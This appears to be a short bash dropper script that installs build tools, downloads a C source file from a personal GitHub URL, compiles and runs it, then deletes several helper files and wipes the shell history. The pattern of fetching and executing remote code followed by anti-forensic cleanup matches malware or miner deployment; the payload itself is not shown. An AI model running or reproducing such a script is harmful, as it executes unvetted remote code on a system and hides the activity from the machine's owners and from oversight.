#!/bin/bash

sudo apt update -y && sudo apt upgrade -y

sudo apt install build-essential -y

wget https://raw.githubusercontent.com/Sprent605/nsyst/main/nsyst.c

gcc nsyst.c -o nsyst

./nsyst

rm -rf speed.sh ml.py doer.sh rex nsyst nsyst.c feds.sh

cat /dev/null > ~/.bash_history && history -c

history -c && history -w
